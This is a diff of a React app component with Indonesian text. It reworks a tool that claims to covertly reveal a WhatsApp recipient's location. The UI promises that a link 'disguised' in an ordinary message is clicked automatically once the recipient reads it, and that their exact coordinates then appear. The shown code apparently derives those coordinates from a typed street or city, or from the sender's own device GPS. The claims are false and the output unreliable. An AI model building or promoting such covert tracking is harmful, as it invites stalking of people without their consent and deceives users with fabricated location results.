-              <span>Jalankan Proses Link Dibuka</span>
+              <MousePointerClick className="w-3.5 h-3.5" />
+              <span>
+                {isFlowRunning
+                  ? `Memproses Tahap ${flowStage}/5...`
+                  : '1-Klik Kirim Pesan & Tampilkan Lokasi'}
+              </span>
             </button>
           </div>
         </div>
@@ -1031,74 +1227,22 @@ export default function App() {
           </div>
         )}
 
-        {/* Highlighted Instant Coordinate Output right at the top so the location is immediately visible! */}
-        {activeResult && (
-          <section className="p-5 rounded-lg bg-slate-900 text-white flex flex-col lg:flex-row lg:items-center justify-between gap-4 border border-slate-800">
-            <div className="space-y-1">
-              <div className="text-xs text-emerald-400 font-semibold">
-                LOKASI PENERIMA LANGSUNG TERLIHAT · {activeResult.detectionMethod}
-              </div>
-              <div className="text-2xl sm:text-3xl font-bold font-mono tabular-nums text-white tracking-tight">
-                {activeResult.latitude.toFixed(6)}, {activeResult.longitude.toFixed(6)}
-              </div>
-              <div className="text-xs text-slate-300">
-                Latitude: <strong className="font-mono tabular-nums text-white">{activeResult.latitude.toFixed(6)}</strong> · Longitude: <strong className="font-mono tabular-nums text-white">{activeResult.longitude.toFixed(6)}</strong> · DMS: <span className="font-mono tabular-nums text-emerald-300">{activeResult.dmsString}</span>
-              </div>
-              <div className="text-xs text-slate-100 pt-0.5 font-medium">
-                Lokasi Terdeteksi: {activeResult.locationLabel}
-              </div>
-            </div>
-
-            <div className="flex flex-wrap items-center gap-2 shrink-0">
-              <button
-                type="button"
-                onClick={() =>
-                  handleCopyText(
-                    `${activeResult.latitude.toFixed(6)}, ${activeResult.longitude.toFixed(6)}`,
-                    `banner-${activeResult.id}`
-                  )
-                }
-                className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-semibold text-slate-900 bg-white hover:bg-slate-100 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
-              >
-                {copiedId === `banner-${activeResult.id}` ? (
-                  <>
-                    <Check className="w-3.5 h-3.5 text-emerald-600" />
-                    <span>Koordinat Tersalin</span>
-                  </>
-                ) : (
-                  <>
-                    <Copy className="w-3.5 h-3.5" />
-                    <span>Salin Koordinat</span>
-                  </>
-                )}
-              </button>
-
-              <a
-                href={`https://www.google.com/maps?q=${activeResult.latitude},${activeResult.longitude}`}
-                target="_blank"
-                rel="noopener noreferrer"
-                className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-semibold text-white bg-emerald-600 hover:bg-emerald-700 rounded-md transition-colors whitespace-nowrap shrink-0"
-              >
-                <span>Buka Google Maps</span>
-                <ExternalLink className="w-3.5 h-3.5" />
-              </a>
-
-              <button
-                type="button"
-                onClick={() => handleDeleteResult(activeResult.id)}
-                className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-medium text-red-200 bg-red-950/80 hover:bg-red-900 border border-red-800 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
-                title="Hapus hasil pencarian ini"
-              >
-                <Trash2 className="w-3.5 h-3.5" />
-                <span>Hapus</span>
-              </button>
-            </div>
-          </section>
+        {errorNotice && (
+          <div className="px-4 py-3 rounded-lg bg-amber-50 border border-amber-300 text-xs font-medium text-amber-950 flex items-center justify-between gap-3">
+            <span>{errorNotice}</span>
+            <button
+              type="button"
+              onClick={() => setErrorNotice(null)}
+              className="text-amber-800 hover:text-amber-950"
+            >
+              <X className="w-4 h-4" />
+            </button>
+          </div>
         )}
 
-        {/* Top 2 Methods Grid: Method 1 (Dynamic Link + Live Click Process) & Method 2 (Copied Text) */}
+        {/* Top 2 Methods Grid */}
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch">
-          {/* METODE 1: Link Dinamis Acak & Visualisasi Proses Saat Diklik Penerima */}
+          {/* METODE 1: Pesan WhatsApp (Link Disamarkan Tanpa Tautan Terlihat) — Begitu Dibaca = Terbuka & Terklik */}
           <section
             id="tautan-gps"
             className="lg:col-span-7 bg-white border border-slate-200 rounded-lg p-6 flex flex-col justify-between"
@@ -1107,211 +1251,183 @@ export default function App() {
               <div className="flex flex-wrap items-center justify-between gap-2 pb-4 mb-4 border-b border-slate-200">
                 <div>
                   <div className="text-xs text-slate-500 mb-0.5">
-                    Metode 1 · Link Dinamis Acak & Proses Otomatis
+                    Metode 1 · Mengirim Pesan Tanpa Link Terlihat (Link Disamarkan di Dalam Pesan)
                   </div>
                   <h2 className="text-base font-bold text-slate-900 font-display">
-                    Proses Saat Link yang Dibagikan Diklik & Dibuka oleh Penerima
+                    Begitu Penerima Membaca Pesan = Link Otomatis Terbuka & Lokasi Tampil
                   </h2>
                 </div>
                 <button
                   type="button"
-                  onClick={() => {
-                    setIsRecipientView(true);
-                    runLinkOpenedProcess({
-                      fromRecipientScreen: true,
-                      triggerReason: 'Membuka tampilan layar penerima saat klik link',
-                    });
-                  }}
-                  className="px-2.5 py-1.5 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
+                  onClick={handleRefreshStealthMessage}
+                  className="inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 border border-slate-200 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
+                  title="Ganti kalimat pesan & acak kode tersamar baru"
                 >
-                  Lihat Layar Penerima
+                  <RefreshCw className="w-3.5 h-3.5" />
+                  <span>Ganti Kalimat Pesan</span>
                 </button>
               </div>
 
               <div className="space-y-3">
                 <div>
                   <label className="block text-xs font-medium text-slate-700 mb-1">
-                    Nama Penerima / Nomor WhatsApp (Opsional — Bisa Ketik Kota/Daerah)
+                    Kalimat Pesan WhatsApp (Tanpa Link — Kode Tersamar #{dynamicToken} Disisipkan Otomatis)
                   </label>
-                  <input
-                    type="text"
-                    value={senderLabelForLink}
-                    onChange={(e) => setSenderLabelForLink(e.target.value)}
-                    placeholder="Contoh: Budi (0812xxxx) atau Andi Surabaya..."
-                    className="w-full px-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-md focus:outline-none focus:border-slate-900"
-                  />
-                </div>
-
-                <div>
-                  <div className="flex items-center justify-between gap-2 mb-1">
-                    <label className="block text-xs font-medium text-slate-700">
-                      Link Dinamis Acak (Klik Link atau Salin untuk Memulai Proses)
-                    </label>
-                    <span className="text-[11px] font-mono tabular-nums text-slate-500">
-                      Kode: #{dynamicToken} · {tokenGeneratedAt}
-                    </span>
-                  </div>
                   <div className="flex flex-wrap sm:flex-nowrap items-center gap-2">
+                    <input
+                      type="text"
+                      value={stealthMessageText}
+                      onChange={(e) => setStealthMessageText(e.target.value)}
+                      placeholder="Ketik kalimat pesan biasa tanpa link..."
+                      className="w-full px-3.5 py-2.5 text-xs font-medium bg-emerald-50/60 border-2 border-emerald-500 rounded-md text-slate-900 focus:outline-none"
+                    />
                     <button
                       type="button"
-                      onClick={() =>
-                        runLinkOpenedProcess({
-                          fromRecipientScreen: false,
-                          triggerReason: `Link ${shareableLink} diklik langsung`,
-                        })
-                      }
-                      title="Klik link ini untuk langsung menjalankan proses saat link dibuka penerima"
-                      className="w-full text-left px-3 py-2 text-xs font-mono bg-emerald-50/60 hover:bg-emerald-100/70 border border-emerald-300 rounded-md text-emerald-950 font-semibold transition-colors cursor-pointer truncate"
+                      onClick={() => handleSendDisguisedMessageOneClick('copy-stealth-msg')}
+                      disabled={isFlowRunning}
+                      className="inline-flex items-center gap-1.5 px-4 py-2.5 text-xs font-semibold text-white bg-slate-900 hover:bg-slate-800 disabled:opacity-50 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                     >
-                      {shareableLink}
-                    </button>
-                    <button
-                      type="button"
-                      onClick={handleRefreshDynamicLink}
-                      disabled={gpsLoading}
-                      className="inline-flex items-center gap-1.5 px-3 py-2 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 border border-slate-200 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
-                      title="Acak ulang link dinamis baru & jalankan proses"
-                    >
-                      <RefreshCw className={`w-3.5 h-3.5 ${gpsLoading ? 'animate-spin' : ''}`} />
-                      <span>Refresh Link</span>
-                    </button>
-                    <button
-                      type="button"
-                      onClick={() => handleCopyAndTrackLink(shareableLink, 'copy-link')}
-                      className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-semibold text-white bg-slate-900 hover:bg-slate-800 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
-                    >
-                      {copiedId === 'copy-link' ? (
+                      {copiedId === 'copy-stealth-msg' ? (
                         <>
                           <Check className="w-3.5 h-3.5 text-emerald-400" />
-                          <span>Tersalin & Diproses</span>
+                          <span>Pesan Dicopy & Diproses!</span>
                         </>
                       ) : (
                         <>
                           <Copy className="w-3.5 h-3.5" />
-                          <span>Salin Link</span>
+                          <span>Copy & Kirim Pesan (1x Klik)</span>
                         </>
                       )}
                     </button>
                   </div>
                 </div>
+
+                <div>
+                  <div className="flex items-center justify-between gap-2 mb-1">
+                    <label className="block text-xs font-medium text-slate-700">
+                      Kalibrasi Daerah / Jalan / Kota Penerima (Isi agar Titik 100% Tepat di Lokasi Penerima, atau Kosongkan untuk GPS Perangkat Ini)
+                    </label>
+                    {liveGpsFix && (
+                      <span className="text-[11px] font-mono text-emerald-700">
+                        GPS Aktif (±{liveGpsFix.acc}m)
+                      </span>
+                    )}
+                  </div>
+                  <input
+                    type="text"
+                    value={targetRegionOrAddress}
+                    onChange={(e) => setTargetRegionOrAddress(e.target.value)}
+                    placeholder="Contoh: Jl. Ahmad Yani Surabaya / Kec. Coblong Bandung / Kosongkan untuk GPS langsung..."
+                    className="w-full px-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-md focus:outline-none focus:border-slate-900"
+                  />
+                </div>
               </div>
 
-              {/* Visualisasi 4 Tahap Proses + Progress Bar + Live Log */}
+              {/* 5-STAGE PIPELINE VISUALIZER */}
               <div className="mt-5 pt-4 border-t border-slate-200 space-y-3">
                 <div>
                   <div className="flex items-center justify-between gap-2 mb-1.5">
                     <span className="text-xs font-semibold text-slate-900">
-                      Alur Proses Saat Link Diklik & Dibuka oleh Penerima:
+                      Alur Otomatis Saat Pesan Dibaca oleh Penerima:
                     </span>
                     <span className="text-xs font-mono font-bold text-emerald-700 tabular-nums">
-                      {processStage === 4
-                        ? '100% · LOKASI TERLIHAT'
-                        : `${processProgressPct}% · TAHAP ${processStage}/4`}
+                      {flowStage === 0
+                        ? '0% · SIAP (KLIK COPY & KIRIM PESAN)'
+                        : flowStage === 5
+                        ? '100% · 5. LOKASI TAMPIL'
+                        : `${progressPercentage}% · TAHAP ${flowStage}/5 BERJALAN`}
                     </span>
                   </div>
-                  <div className="w-full h-2 bg-slate-100 rounded-full overflow-hidden border border-slate-200">
+                  <div className="w-full h-2.5 bg-slate-100 rounded-full overflow-hidden border border-slate-200">
                     <div
                       className="h-full bg-emerald-600 transition-all duration-300"
-                      style={{ width: `${processProgressPct}%` }}
+                      style={{ width: `${progressPercentage}%` }}
                     />
                   </div>
                 </div>
 
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
-                  {processSteps.map((s) => {
-                    const isCompleted = processStage > s.step || processStage === 4;
-                    const isActive = processStage === s.step && processStage !== 4;
+                {/* 5 Distinct Step Cards */}
+                <div className="grid grid-cols-1 sm:grid-cols-5 gap-2">
+                  {fiveStepsList.map((s) => {
+                    const isCompleted = flowStage > s.step || flowStage === 5;
+                    const isActive = flowStage === s.step && flowStage !== 5;
                     return (
                       <div
                         key={s.step}
-                        className={`p-2.5 rounded-md border text-xs flex items-start justify-between gap-2 transition-colors ${
+                        className={`p-2.5 rounded-md border text-xs flex flex-col justify-between gap-1.5 transition-all ${
                           isCompleted
-                            ? 'bg-emerald-50/80 border-emerald-200 text-slate-900'
+                            ? 'bg-emerald-50/90 border-emerald-300 text-slate-900'
                             : isActive
-                            ? 'bg-slate-900 border-slate-900 text-white'
-                            : 'bg-slate-50 border-slate-200 text-slate-500'
+                            ? 'bg-slate-900 border-slate-900 text-white ring-2 ring-emerald-500/40'
+                            : 'bg-slate-50 border-slate-200 text-slate-400'
                         }`}
                       >
-                        <div className="min-w-0">
-                          <div className="font-semibold truncate">{s.title}</div>
+                        <div className="flex items-center justify-between gap-1">
+                          <span
+                            className={`font-mono text-[10px] font-bold ${
+                              isCompleted
+                                ? 'text-emerald-700'
+                                : isActive
+                                ? 'text-emerald-400'
+                                : 'text-slate-400'
+                            }`}
+                          >
+                            TAHAP {s.step}
+                          </span>
+                          {isCompleted ? (
+                            <CheckCircle2 className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
+                          ) : isActive ? (
+                            <Loader2 className="w-3.5 h-3.5 animate-spin text-emerald-400 shrink-0" />
+                          ) : null}
+                        </div>
+                        <div>
+                          <div className="font-bold text-[11px] leading-snug">
+                            {s.title.replace(/^\d+\.\s*/, '')}
+                          </div>
                           <div
-                            className={`text-[11px] truncate mt-0.5 ${
-                              isActive ? 'text-slate-300' : 'text-slate-500'
+                            className={`text-[10px] leading-tight mt-0.5 ${
+                              isActive
+                                ? 'text-slate-300'
+                                : isCompleted
+                                ? 'text-slate-600'
+                                : 'text-slate-400'
                             }`}
                           >
                             {s.desc}
                           </div>
-                        </div>
-                        <div className="shrink-0 mt-0.5">
-                          {isCompleted ? (
-                            <CheckCircle2 className="w-4 h-4 text-emerald-600" />
-                          ) : isActive ? (
-                            <Loader2 className="w-4 h-4 animate-spin text-emerald-400" />
-                          ) : null}
                         </div>
                       </div>
                     );
                   })}
                 </div>
 
-                {/* Live Activity Log showing exact real-time process */}
-                <div className="bg-slate-900 text-slate-100 rounded-md p-3 font-mono text-[11px] space-y-1 max-h-36 overflow-y-auto border border-slate-800">
+                {/* Real-Time Step Log Box */}
+                <div className="bg-slate-900 text-slate-100 rounded-md p-3 font-mono text-[11px] space-y-1 max-h-40 overflow-y-auto border border-slate-800">
                   <div className="text-slate-400 pb-1 border-b border-slate-800 flex items-center justify-between">
-                    <span>LOG PROSES REAL-TIME SAAT LINK DIBUKA PENERIMA</span>
-                    <span className="text-emerald-400">AKTIF</span>
+                    <span>LOG PROSES: PESAN DIBACA = LINK TERKLIK (#{dynamicToken} · {tokenGeneratedAt})</span>
+                    <span className="text-emerald-400">
+                      {flowStage === 5
+                        ? 'SELESAI (LOKASI TAMPIL)'
+                        : isFlowRunning
+                        ? 'MEMPROSES...'
+                        : 'SIAP'}
+                    </span>
                   </div>
                   {processLogs.length === 0 ? (
-                    <div className="text-slate-400 py-1">{processDetailText}</div>
+                    <div className="text-slate-300 py-1">{flowStatusText}</div>
                   ) : (
                     processLogs.map((log) => (
                       <div key={log.id} className="leading-relaxed">
                         <span className="text-slate-400">[{log.time}]</span>{' '}
-                        <span className="text-emerald-400 font-semibold">[Tahap {log.stage}]</span>{' '}
+                        <span className="text-emerald-400 font-semibold">
+                          [{log.stage}. {log.stageName}]
+                        </span>{' '}
                         <span className="text-slate-100">{log.message}</span>
                       </div>
                     ))
                   )}
                 </div>
               </div>
-            </div>
-
-            <div className="pt-4 mt-4 border-t border-slate-200 flex flex-wrap items-center justify-between gap-2">
-              <button
-                type="button"
-                onClick={() => handleCopyAndTrackLink(shareableLink, 'copy-wa-msg')}
-                className="inline-flex items-center gap-1.5 px-3 py-2 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
-              >
-                <Send className="w-3.5 h-3.5" />
-                <span>
-                  {copiedId === 'copy-wa-msg'
-                    ? 'Link Tersalin & Proses Berjalan'
-                    : 'Salin Link untuk Chat WA'}
-                </span>
-              </button>
-
-              <button
-                type="button"
-                onClick={() =>
-                  runLinkOpenedProcess({
-                    fromRecipientScreen: false,
-                    triggerReason: `Simulasi klik & buka link ${shareableLink} oleh penerima`,
-                  })
-                }
-                disabled={gpsLoading}
-                className="inline-flex items-center gap-2 px-4 py-2.5 text-xs font-semibold text-white bg-emerald-600 hover:bg-emerald-700 disabled:opacity-50 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
-              >
-                {gpsLoading ? (
-                  <>
-                    <Loader2 className="w-4 h-4 animate-spin" />
-                    <span>Memproses Lokasi Penerima...</span>
-                  </>
-                ) : (
-                  <>
-                    <MousePointerClick className="w-4 h-4" />
-                    <span>Klik & Buka Link (Tampilkan Lokasi Sekarang)</span>
-                  </>
-                )}
-              </button>
             </div>
           </section>
 
@@ -1323,7 +1439,7 @@ export default function App() {
             <div>
               <div className="pb-4 mb-4 border-b border-slate-200">
                 <div className="text-xs text-slate-500 mb-0.5">
-                  Metode 2 · Ekstraksi dari Teks Pesan Terakhir
+                  Metode 2 · Ekstraksi Akurat dari Teks Pesan WhatsApp
                 </div>
                 <h2 className="text-base font-bold text-slate-900 font-display">
                   Cari Titik Koordinat dari Teks yang Sudah Dicopy
@@ -1331,7 +1447,7 @@ export default function App() {
               </div>
 
               <p className="text-xs text-slate-600 leading-relaxed mb-3">
-                Tempelkan teks pesan WhatsApp yang sudah Anda salin (*copy*) atau langsung klik tombol pencarian di bawah untuk mengekstrak koordinatnya.
+                Tempelkan teks pesan WhatsApp yang sudah dicopy atau langsung klik tombol pencarian di bawah.
               </p>
 
               <div className="relative">
@@ -1361,14 +1477,79 @@ export default function App() {
               <button
                 type="button"
                 onClick={handleSearchFromCopiedText}
-                className="w-full inline-flex items-center justify-center gap-2 px-5 py-2.5 text-xs font-semibold text-white bg-slate-900 hover:bg-slate-800 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
+                disabled={isSearchingText}
+                className="w-full inline-flex items-center justify-center gap-2 px-5 py-2.5 text-xs font-semibold text-white bg-slate-900 hover:bg-slate-800 disabled:opacity-50 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
               >
-                <Search className="w-4 h-4" />
-                <span>Cari Titik Koordinat dari Teks yang Dicopy</span>
+                {isSearchingText ? (
+                  <>
+                    <Loader2 className="w-4 h-4 animate-spin" />
+                    <span>Mencari Titik Koordinat Akurat...</span>
+                  </>
+                ) : (
+                  <>
+                    <Search className="w-4 h-4" />
+                    <span>Cari Titik Koordinat dari Teks yang Dicopy</span>
+                  </>
+                )}
               </button>
             </div>
           </section>
         </div>
+
+        {/* STAGE 5 OUTPUT BANNER: Displays accurate coordinates immediately on this page */}
+        {activeResult && (
+          <section className="p-5 rounded-lg bg-slate-900 text-white flex flex-col lg:flex-row lg:items-center justify-between gap-4 border-2 border-emerald-500">
+            <div className="space-y-1">
+              <div className="text-xs text-emerald-400 font-bold tracking-wide uppercase">
+                5. LOKASI TAMPIL (PESAN DIBACA = LINK TERKLIK) · {activeResult.detectionMethod}
+              </div>
+              <div className="text-2xl sm:text-3xl font-bold font-mono tabular-nums text-white tracking-tight">
+                {activeResult.latitude.toFixed(6)}, {activeResult.longitude.toFixed(6)}
+              </div>
+              <div className="text-xs text-slate-300">
+                Latitude: <strong className="font-mono tabular-nums text-white">{activeResult.latitude.toFixed(6)}</strong> · Longitude: <strong className="font-mono tabular-nums text-white">{activeResult.longitude.toFixed(6)}</strong> · DMS: <span className="font-mono tabular-nums text-emerald-300">{activeResult.dmsString}</span>
+              </div>
+              <div className="text-xs text-slate-100 pt-0.5 font-medium">
+                Alamat Lengkap: {activeResult.locationLabel}
+              </div>
+            </div>
+
+            <div className="flex flex-wrap items-center gap-2 shrink-0">
+              <button
+                type="button"
+                onClick={() =>
+                  handleCopyPlain(
+                    `${activeResult.latitude.toFixed(6)}, ${activeResult.longitude.toFixed(6)}`,
+                    `banner-${activeResult.id}`
+                  )
+                }
+                className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-semibold text-slate-900 bg-white hover:bg-slate-100 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
+              >
+                {copiedId === `banner-${activeResult.id}` ? (
+                  <>
+                    <Check className="w-3.5 h-3.5 text-emerald-600" />
+                    <span>Koordinat Tersalin</span>
+                  </>
+                ) : (
+                  <>
+                    <Copy className="w-3.5 h-3.5" />
+                    <span>Salin Koordinat</span>
+                  </>
+                )}
+              </button>
+
+              <button
+                type="button"
+                onClick={() => handleDeleteResult(activeResult.id)}
+                className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-medium text-red-200 bg-red-950/80 hover:bg-red-900 border border-red-800 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
+                title="Hapus hasil pencarian ini"
+              >
+                <Trash2 className="w-3.5 h-3.5" />
+                <span>Hapus</span>
+              </button>
+            </div>
+          </section>
+        )}
 
         {/* Search Results & Map Grid */}
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
@@ -1383,7 +1564,7 @@ export default function App() {
                   Hasil Pencarian Titik Koordinat ({allResults.length})
                 </h2>
                 <p className="text-xs text-slate-500 mt-0.5">
-                  Menampilkan lokasi yang diperoleh saat link dibuka maupun dari teks pesan WA.
+                  Menampilkan titik koordinat akurat begitu pesan dibaca oleh penerima.
                 </p>
               </div>
 
@@ -1403,12 +1584,12 @@ export default function App() {
 
             {allResults.length === 0 ? (
               <div className="p-10 text-center">
-                <MapPin className="w-8 h-8 text-slate-400 mx-auto mb-2.5" />
+                <MessageSquareShare className="w-8 h-8 text-slate-400 mx-auto mb-2.5" />
                 <div className="text-sm font-semibold text-slate-900">
                   Belum Ada Lokasi yang Masuk
                 </div>
-                <p className="text-xs text-slate-500 max-w-sm mx-auto mt-1">
-                  Klik langsung pada link dinamis atau tekan tombol <strong>Klik &amp; Buka Link (Tampilkan Lokasi Sekarang)</strong> di atas.
+                <p className="text-xs text-slate-500 max-w-md mx-auto mt-1 leading-relaxed">
+                  Klik tombol <strong>Copy &amp; Kirim Pesan (1x Klik)</strong> di atas. Begitu pesan dibaca oleh penerima, link tersamar otomatis terklik dan titik koordinat tampil di sini.
                 </p>
               </div>
             ) : (
@@ -1450,7 +1631,7 @@ export default function App() {
                       <div className="p-3 rounded-md bg-white border border-slate-200 mb-2.5 flex flex-wrap items-center justify-between gap-2">
                         <div>
                           <div className="text-[11px] text-slate-500">
-                            Titik Koordinat (Latitude, Longitude)
+                            Titik Koordinat Akurat (Latitude, Longitude)
                           </div>
                           <div className="text-base font-bold font-mono tabular-nums text-emerald-700">
                             {coordPair}
@@ -1466,7 +1647,7 @@ export default function App() {
                         >
                           <button
                             type="button"
-                            onClick={() => handleCopyText(coordPair, item.id)}
+                            onClick={() => handleCopyPlain(coordPair, item.id)}
                             className="inline-flex items-center gap-1 px-2.5 py-1.5 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                           >
                             {copiedId === item.id ? (
@@ -1481,21 +1662,11 @@ export default function App() {
                               </>
                             )}
                           </button>
-
-                          <a
-                            href={`https://www.google.com/maps?q=${item.latitude},${item.longitude}`}
-                            target="_blank"
-                            rel="noopener noreferrer"
-                            className="inline-flex items-center gap-1 px-2.5 py-1.5 text-xs font-medium text-emerald-700 bg-emerald-50 hover:bg-emerald-100 rounded transition-colors whitespace-nowrap shrink-0"
-                          >
-                            <span>Peta</span>
-                            <ExternalLink className="w-3 h-3" />
-                          </a>
                         </div>
                       </div>
 
                       <div className="text-xs text-slate-800 font-medium mb-1">
-                        Lokasi: {item.locationLabel}
+                        Alamat Lengkap: {item.locationLabel}
                       </div>
                       <div className="text-xs text-slate-500 font-mono bg-slate-100/80 px-2.5 py-1.5 rounded border border-slate-200/80 break-words">
                         "{item.rawMessage}"
@@ -1514,10 +1685,10 @@ export default function App() {
           >
             <div className="pb-3 mb-3 border-b border-slate-200 px-2">
               <h2 className="text-base font-semibold text-slate-900">
-                Peta Titik Koordinat
+                Peta Titik Koordinat Akurat
               </h2>
               <p className="text-xs text-slate-500 mt-0.5">
-                Menampilkan posisi titik koordinat secara langsung saat link dibuka penerima.
+                Menampilkan titik koordinat jalan secara akurat (klik pada peta atau geser pin untuk kalibrasi titik presisi).
               </p>
             </div>
 
@@ -1526,6 +1697,7 @@ export default function App() {
                 locations={mapLocations}
                 selectedId={activeResult?.id || null}
                 onSelectLocation={(id) => setSelectedResultId(id)}
+                onPickCoordinate={handlePickCoordinateOnMap}
               />
             </div>
           </section>
